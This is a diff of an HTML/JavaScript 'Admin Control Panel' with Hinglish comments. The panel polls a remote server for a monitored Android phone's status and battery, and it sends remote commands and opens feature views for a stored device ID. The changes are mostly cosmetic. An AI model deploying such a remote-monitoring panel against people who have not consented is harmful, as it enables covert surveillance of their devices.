@@ -6,7 +6,6 @@
     <title>Admin Control Panel</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* AAPKA ORIGINAL CSS - KOI BADLAV NAHI */
         :root {
             --bg-color: #0f0f0f;
             --glass-bg: rgba(255, 255, 255, 0.1);
@@ -39,6 +38,7 @@
         .dot { height: 10px; width: 10px; border-radius: 50%; background: #555; transition: 0.3s; }
         .dot.online { background: var(--accent); box-shadow: 0 0 10px var(--accent); }
         .dot.offline { background: var(--offline); box-shadow: 0 0 10px var(--offline); }
+        
         .info-panel { display: flex; gap: 12px; margin-bottom: 20px; }
         .info-card {
             flex: 1; background: var(--glass-bg); padding: 12px;
@@ -46,10 +46,12 @@
         }
         .label { font-size: 0.65rem; color: var(--text-muted); letter-spacing: 1px; margin-bottom: 5px; }
         .value { font-size: 0.9rem; font-weight: 500; }
+        
         .battery-details { background: rgba(255,255,255,0.03); border-radius: 15px; padding: 15px; margin-bottom: 20px; }
         .battery-header { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 0.85rem; }
         .battery-bar-bg { width: 100%; height: 6px; background: #333; border-radius: 10px; overflow: hidden; }
         .battery-bar-fill { width: 0%; height: 100%; background: var(--accent); transition: 1s ease-in-out; }
+        
         .controls-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
         .control-btn {
             background: var(--glass-bg); border-radius: 18px; aspect-ratio: 1/1;
@@ -60,13 +62,19 @@
         .control-btn:hover { background: rgba(255, 255, 255, 0.15); transform: translateY(-2px); border-color: var(--accent); }
         .control-btn i { font-size: 1.2rem; margin-bottom: 6px; }
         .control-btn span { font-size: 0.6rem; text-align: center; color: #bbb; }
-        .id-display { margin-bottom: 15px; font-size: 0.8rem; color: #00f3ff; cursor: pointer; border: 1px dashed #00f3ff; padding: 5px 15px; border-radius: 10px; }
+        
+        .id-display { 
+            margin-bottom: 15px; font-size: 0.8rem; color: #00f3ff; cursor: pointer; 
+            border: 1px dashed #00f3ff; padding: 8px 20px; border-radius: 12px;
+            background: rgba(0, 243, 255, 0.05);
+        }
     </style>
 </head>
 <body>
 
     <div class="id-display" onclick="askID()">
         <i class="fa-solid fa-id-card"></i> Monitoring ID: <span id="currentID">None</span>
+        <i class="fa-solid fa-pen-to-square" style="margin-left:10px; font-size:0.7rem;"></i>
     </div>
 
     <div class="container">
@@ -87,7 +95,7 @@
                 <div id="androidVer" class="value">--</div>
             </div>
             <div class="info-card">
-                <div class="label">NETWORK</div>
+                <div class="label">STATUS</div>
                 <div id="networkType" class="value">--</div>
             </div>
         </div>
@@ -100,7 +108,7 @@
             <div class="battery-bar-bg">
                 <div id="batteryFill" class="battery-bar-fill"></div>
             </div>
-            <div id="batteryStatus" style="font-size: 0.7rem; color: var(--text-muted); margin-top: 8px;">Waiting...</div>
+            <div id="batteryStatus" style="font-size: 0.7rem; color: var(--text-muted); margin-top: 8px;">Waiting for ping...</div>
         </div>
 
         <div class="controls-grid">
@@ -128,14 +136,14 @@
     <script>
         const API_BASE = 'https://child-v9no.onrender.com';
         
-        // --- FIXED LOGIC: LocalStorage se ID load karega ---
+        // 1. LocalStorage se ID load karna (Ak baar dali, hamesha rahegi)
         let DEVICE_ID = localStorage.getItem('monitoring_id') || '';
 
         function askID() {
-            let id = prompt("Bhai, App mein dikhne waali 6-Digit ID dalo:", DEVICE_ID);
-            if (id) {
-                DEVICE_ID = id;
-                localStorage.setItem('monitoring_id', id); // Memory mein save
+            let id = prompt("Phone App mein dikhne waali ID dalo:", DEVICE_ID);
+            if (id && id.trim() !== "") {
+                DEVICE_ID = id.trim();
+                localStorage.setItem('monitoring_id', DEVICE_ID); // Memory mein save
                 document.getElementById('currentID').innerText = DEVICE_ID;
                 updateDashboard();
             }
@@ -148,12 +156,14 @@
             }
             document.getElementById('currentID').innerText = DEVICE_ID;
 
+            // Naye Server Logic ke hisaab se call
             fetch(`${API_BASE}/api/device-status/${DEVICE_ID}`)
                 .then(res => res.json())
                 .then(data => {
                     if(data.id || data.lastSeen) {
+                        // Agar server par model name hai toh wo dikhao, nahi toh ID
                         document.getElementById('deviceName').innerText = data.model || DEVICE_ID;
-                        document.getElementById('androidVer').innerText = "V" + (data.version || "--");
+                        document.getElementById('androidVer').innerText = data.version ? "V" + data.version : "--";
                         
                         const dot = document.getElementById('statusDot');
                         const statusText = document.getElementById('statusText');
@@ -173,20 +183,22 @@
                         const battery = data.battery || 0;
                         document.getElementById('batteryPercent').innerText = battery + "%";
                         document.getElementById('batteryFill').style.width = battery + "%";
-                        document.getElementById('batteryStatus').innerText = data.charging ? "Charging..." : "Discharging";
+                        document.getElementById('batteryStatus').innerText = data.charging ? "⚡ Charging..." : "🔋 On Battery";
                     } else {
                         document.getElementById('statusText').innerText = "Not Found";
+                        document.getElementById('deviceName').innerText = "Unknown Device";
                     }
                 })
                 .catch(err => {
-                    console.log("Server waking up...");
-                    document.getElementById('statusText').innerText = "Syncing...";
+                    console.error("Fetch error");
+                    document.getElementById('statusText').innerText = "Offline";
                 });
         }
 
-        // --- FIXED LOGIC: URL mein ID pass karega har page ke liye ---
+        // Feature page pe ID lekar jana
         function openView(page) {
             if(!DEVICE_ID) return askID();
+            // URL mein ID pass karna zaroori hai
             window.location.href = `view_${page}.html?id=${DEVICE_ID}`;
         }
 
@@ -196,10 +208,7 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ device_id: DEVICE_ID, command: action })
-            })
-            .then(res => res.json())
-            .then(data => console.log("Cmd Sent:", action))
-            .catch(err => console.error("Command Error"));
+            }).then(() => console.log("Command sent:", action));
         }
 
         let currentMode = 0;
@@ -222,9 +231,9 @@
             }
         }
 
+        // Har 5 second mein update
         setInterval(updateDashboard, 5000);
         
-        // Page load hote hi agar ID hai toh check karo
         window.onload = () => {
             if(DEVICE_ID) {
                 updateDashboard();
